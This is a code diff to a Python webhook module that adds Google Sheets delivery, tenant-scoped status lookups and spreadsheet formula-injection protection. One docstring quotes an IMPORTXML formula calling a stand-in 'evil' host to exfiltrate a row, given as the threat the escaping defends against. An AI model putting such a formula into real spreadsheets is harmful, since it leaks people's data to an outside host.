@@ -20,6 +20,13 @@ about their own data, recorded in the config row rather than assumed.
 
 Delivery outcomes land in `webhook_deliveries(direction='out')`, which is the forensic
 half of SEC-COMP §5 and the data the "webhook activity" screen reads.
+
+**Two endpoint kinds, ONE definition of "delivered".** D-23 promises webhooks *and*
+Google Sheets. They differ only in the transport at the very end: the fan-out, the
+per-endpoint redaction, the delivery id, the forensic row and the retry ladder are
+shared, because a client asking "did my lead arrive?" must get an answer built the same
+way whichever box they ticked. The sheets-specific pieces live below under
+`# --- google sheets ---` and are used by `apps/workers/sheets_sync.py`.
 """
 
 from __future__ import annotations
@@ -27,8 +34,11 @@ from __future__ import annotations
 import hashlib
 import hmac
 import json
+import re
+from collections.abc import Sequence
 from dataclasses import dataclass
 from datetime import UTC, datetime
+from decimal import Decimal
 from typing import Any
 from uuid import UUID
 
@@ -53,6 +63,17 @@ EVENT_TYPES: tuple[str, ...] = (
     "campaign.completed",
 )
 
+# The endpoint kinds in `outbound_webhooks.kind`.
+WEBHOOK_KIND = "webhook"
+SHEET_KIND = "google_sheets"
+
+# Kinds `enqueue_event` will fan out to. Deliberately NOT `models.OUTBOUND_KINDS`: that
+# tuple is the CHECK constraint — what may EXIST — and a kind added there must not start
+# queueing deliveries into a worker that has no branch for it. A kind joins this tuple
+# when it has a delivery path, and `tests/sheets_sync_test.py` asserts the two sets match
+# so the reverse (a kind a client can configure and nothing delivers) cannot come back.
+DELIVERABLE_KINDS: tuple[str, ...] = (WEBHOOK_KIND, SHEET_KIND)
+
 SIGNATURE_HEADER = "X-Calevate-Signature"
 TIMESTAMP_HEADER = "X-Calevate-Timestamp"
 EVENT_HEADER = "X-Calevate-Event"
@@ -69,9 +90,20 @@ MAX_ATTEMPTS = WORKER_MAX_TRIES
 
 @dataclass(frozen=True, slots=True)
 class DeliveryResult:
+    """The outcome of ONE attempt at one endpoint, whatever the transport was."""
+
     delivered: bool
     status_code: int | None
     error: str | None = None
+    # Which transport produced this. Written into the forensic row's `source`, so a
+    # delivery log read six months later says how the lead was supposed to travel.
+    channel: str = "http"
+    # Whether another attempt could plausibly change the answer. `None` means "decide
+    # from the HTTP status" — the webhook path's rules, which are the only ones a status
+    # code can express. A transport with no status codes (the sheets append) MUST say,
+    # because "no status" would otherwise read as a transport blip and a permanent
+    # refusal would climb the ladder three times to reach the same no.
+    transient: bool | None = None
 
 
 def sign_payload(secret: str, *, timestamp: str, body: str) -> str:
@@ -144,13 +176,17 @@ async def enqueue_event(
     if event not in EVENT_TYPES:
         raise ValueError(f"unknown outbound event: {event}")
 
+    # Every kind we can actually deliver, not just `webhook`: a client who picked
+    # Google Sheets subscribed to the same events and gets the same fan-out. The kind
+    # is NOT copied into the payload — the worker reads it off the endpoint row, which
+    # is the only place it can change.
     endpoints = (
         await session.execute(
             text(
                 "SELECT id, mapping FROM outbound_webhooks WHERE active = true "
-                "AND kind = 'webhook' AND :event = ANY(events)"
+                "AND kind = ANY(:kinds) AND :event = ANY(events)"
             ),
-            {"event": event},
+            {"event": event, "kinds": list(DELIVERABLE_KINDS)},
         )
     ).all()
 
@@ -176,17 +212,47 @@ async def enqueue_event(
 
 
 async def load_endpoint(session: AsyncSession, endpoint_id: UUID) -> dict[str, Any] | None:
+    """The endpoint as the worker sees it. MUST run inside a `tenant_session`: this is a
+    plain select and RLS on `outbound_webhooks` is the whole of its tenant scoping, so a
+    neighbour's endpoint id returns None rather than a row (hard rule 1)."""
     row = (
         await session.execute(
             text(
-                "SELECT id, url, secret_ref, mapping, active FROM outbound_webhooks WHERE id = :id"
+                "SELECT id, url, secret_ref, mapping, active, kind "
+                "FROM outbound_webhooks WHERE id = :id"
             ),
             {"id": endpoint_id},
         )
     ).first()
     if row is None or not row[4]:
         return None
-    return {"id": row[0], "url": row[1], "secret": row[2], "mapping": row[3] or {}}
+    # `secret` is the raw signing secret for a webhook and a secrets-manager REFERENCE
+    # for a sheet (DATA-MODEL §6) — the column holds whichever the kind implies, and
+    # neither is ever logged.
+    return {"id": row[0], "url": row[1], "secret": row[2], "mapping": row[3] or {}, "kind": row[5]}
+
+
+async def delivery_status(session: AsyncSession, delivery_id: UUID) -> str | None:
+    """The recorded status of one delivery, or None if this tenant has no such row.
+
+    Scoped THROUGH `outbound_webhooks` rather than read by primary key, for the same
+    reason the client-facing delivery screen is: `webhook_deliveries` carries no RLS
+    policy (engine webhooks arrive before a tenant is resolved), so a bare
+    `WHERE id = :id` would let one tenant's delivered row answer for another's — and
+    for the sheets path that answer SUPPRESSES an append.
+    """
+    row = (
+        await session.execute(
+            text(
+                "SELECT status FROM webhook_deliveries WHERE id = :id "
+                "AND endpoint_id IN (SELECT id FROM outbound_webhooks)"
+            ),
+            {"id": delivery_id},
+        )
+    ).first()
+    if row is None or row[0] is None:
+        return None
+    return str(row[0])
 
 
 def apply_mapping(data: dict[str, Any], mapping: dict[str, Any]) -> dict[str, Any]:
@@ -214,23 +280,25 @@ async def record_delivery(
     status: str,
     attempts: int,
     status_code: int | None,
+    channel: str = "http",
 ) -> None:
     """Forensic log, upserted by delivery id so retries update one row (SEC-COMP §5).
 
     No payload column and no payload ref: the body is reconstructible from the domain
     row, and a table of un-redacted CRM payloads is a breach waiting for a query.
+
+    `channel` is the transport (`http`, `sheets`). It is the only thing that differs
+    between the two endpoint kinds here — ONE log, one row per delivery, one vocabulary
+    of statuses (`delivered` / `failed` / `skipped`, WEBHOOKS §1.5) — so the delivery
+    screen a client reads does not care which box they ticked.
     """
+    source = f"{channel}_{status_code}" if status_code else channel
     result = await session.execute(
         text(
             "UPDATE webhook_deliveries SET attempts = :attempts, status = :status, "
             "source = :src, last_at = now() WHERE id = :id"
         ),
-        {
-            "attempts": attempts,
-            "status": status,
-            "src": f"http_{status_code}" if status_code else "http",
-            "id": delivery_id,
-        },
+        {"attempts": attempts, "status": status, "src": source, "id": delivery_id},
     )
     if rowcount_of(result) == 0:
         await session.execute(
@@ -241,7 +309,7 @@ async def record_delivery(
             ),
             {
                 "id": delivery_id,
-                "src": f"http_{status_code}" if status_code else "http",
+                "src": source,
                 "event": event,
                 "status": status,
                 "attempts": attempts,
@@ -314,21 +382,169 @@ def lead_payload(row: dict[str, Any], *, include_raw_phone: bool) -> dict[str, A
     return payload
 
 
+# --- google sheets -------------------------------------------------------------
+# The config row is the SAME row a webhook uses (DATA-MODEL §6): `url` names the
+# spreadsheet, `secret_ref` is the secrets-manager reference to the service account,
+# `mapping` carries the sheet-shaped extras. Nothing here needs a migration.
+#
+#     {"worksheet": "Leads",
+#      "columns":  ["lead_id", "name", "phone", "status"],   <- ORDER LIVES IN A LIST
+#      "headers":  {"lead_id": "Lead Ref"},
+#      "include_raw_phone": false}
+
+# Google's own id shape: url-safe base64-ish, 44 chars in practice. The floor of 20
+# exists so a stray word in the url column cannot be mistaken for a document id.
+_SHEET_URL_RE = re.compile(r"/spreadsheets/d/([A-Za-z0-9_-]{20,})")
+_SHEET_ID_RE = re.compile(r"^[A-Za-z0-9_-]{20,}$")
+
+DEFAULT_WORKSHEET = "Leads"
+
+# Appended to every row and named in every header. It is the same id as the envelope's
+# `id` and the forensic row's, which is what makes a sheet reconcilable against the
+# delivery log by a human — and what a future adapter can read back to close the crash
+# window described in `apps/workers/sheets_sync.py`.
+SHEET_DELIVERY_HEADER = "Calevate Delivery ID"
+
+# Column ORDER per event, for endpoints that did not choose their own. Only the events
+# whose payload shape is published (WEBHOOKS §1.2) appear here: an event with no entry
+# and no configured `columns` is REFUSED rather than guessed, because inferring the
+# order from one row's keys silently shifts every value the first time a field is
+# absent — and a spreadsheet has no per-row schema to catch it.
+DEFAULT_SHEET_COLUMNS: dict[str, tuple[str, ...]] = {
+    "lead.created": ("lead_id", "name", "phone", "source", "status"),
+    "lead.updated": ("lead_id", "name", "phone", "source", "status"),
+    "call.completed": (
+        "call_id",
+        "lead_id",
+        "direction",
+        "duration_s",
+        "outcome",
+        "sentiment",
+        "summary",
+    ),
+}
+
+# Characters that make a spreadsheet treat a cell as an expression. `=` and `@` are
+# Sheets formulas; `+` and `-` are Excel's, which matters the moment the client exports
+# to CSV. A lead's name is written by a caller or a web form, so this is untrusted text
+# landing in a document a human opens.
+_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def parse_spreadsheet_ref(url: str | None) -> str | None:
+    """The spreadsheet id from what the client configured, or None if it is not one.
+
+    Accepts the url they copy out of the browser and a bare id. Refuses everything else:
+    appending a client's leads into a document we guessed the identity of is worse than
+    not delivering, and the refusal is visible on their delivery screen.
+    """
+    if not url:
+        return None
+    candidate = url.strip()
+    match = _SHEET_URL_RE.search(candidate)
+    if match:
+        return match.group(1)
+    return candidate if _SHEET_ID_RE.match(candidate) else None
+
+
+def sheet_worksheet(mapping: dict[str, Any]) -> str:
+    """The tab to append to. One default, so an endpoint configured with no worksheet
+    lands somewhere predictable rather than wherever the API considers first."""
+    worksheet = mapping.get("worksheet")
+    if isinstance(worksheet, str) and worksheet.strip():
+        return worksheet.strip()
+    return DEFAULT_WORKSHEET
+
+
+def sheet_columns(event: str, mapping: dict[str, Any]) -> tuple[str, ...]:
+    """OUR field names, in the order they become columns.
+
+    Read from a JSON **array**, never from object keys: `mapping` is JSONB and Postgres
+    stores object keys sorted by length then bytes, so a column order expressed as keys
+    comes back scrambled and every row would land under different headings than the
+    last. An empty result means "we do not know the order" and the caller must refuse.
+    """
+    configured = mapping.get("columns")
+    if isinstance(configured, list):
+        names = tuple(name for name in configured if isinstance(name, str) and name)
+        if names:
+            return names
+    return DEFAULT_SHEET_COLUMNS.get(event, ())
+
+
+def sheet_header(columns: Sequence[str], mapping: dict[str, Any]) -> list[str]:
+    """The header row: the client's own column names where they gave us one.
+
+    Order comes from `columns` (a list); `headers` only renames, so a jsonb object is
+    the right shape for it and its key order is irrelevant.
+    """
+    raw = mapping.get("headers")
+    headers = raw if isinstance(raw, dict) else {}
+    return [str(headers.get(name, name)) for name in columns] + [SHEET_DELIVERY_HEADER]
+
+
+def sheet_row(data: dict[str, Any], columns: Sequence[str], delivery_id: UUID | str) -> list[str]:
+    """One row of cells, in column order, ending with the delivery id.
+
+    A field the event did not carry is an EMPTY cell, never `None` — the same reasoning
+    as `apply_mapping` not inventing nulls, except that here a missing value would print
+    the word "None" into a document a client shows their staff.
+    """
+    return [_cell(data.get(name)) for name in columns] + [str(delivery_id)]
+
+
+def _cell(value: Any) -> str:
+    if value is None:
+        return ""
+    if isinstance(value, bool):  # bool before int — it is a subclass
+        return "true" if value else "false"
+    if isinstance(value, str):
+        rendered = value
+    elif isinstance(value, int | float | Decimal):
+        rendered = str(value)
+    else:
+        rendered = json.dumps(value, separators=(",", ":"), default=str)
+    return _disarm(rendered)
+
+
+def _disarm(rendered: str) -> str:
+    """Neutralise spreadsheet formula injection, belt and braces with `RAW` input.
+
+    The leading apostrophe is Sheets' own "this is text" marker: it is NOT shown in the
+    rendered cell, so a phone number still reads as a phone number while
+    `=IMPORTXML("https://evil…"&A1,"//x")` — a name a caller can choose — stays a
+    string instead of exfiltrating the row it sits in.
+    """
+    return f"'{rendered}" if rendered[:1] in _FORMULA_LEADERS else rendered
+
+
 __all__ = [
+    "DEFAULT_SHEET_COLUMNS",
+    "DEFAULT_WORKSHEET",
+    "DELIVERABLE_KINDS",
     "DELIVERY_HEADER",
     "EVENT_HEADER",
     "EVENT_TYPES",
     "MAX_ATTEMPTS",
+    "SHEET_DELIVERY_HEADER",
+    "SHEET_KIND",
     "SIGNATURE_HEADER",
     "TIMESTAMP_HEADER",
+    "WEBHOOK_KIND",
     "DeliveryResult",
     "apply_mapping",
     "build_envelope",
     "deliver",
+    "delivery_status",
     "enqueue_event",
     "lead_payload",
     "load_endpoint",
+    "parse_spreadsheet_ref",
     "record_delivery",
+    "sheet_columns",
+    "sheet_header",
+    "sheet_row",
+    "sheet_worksheet",
     "sign_payload",
     "verify_signature",
 ]
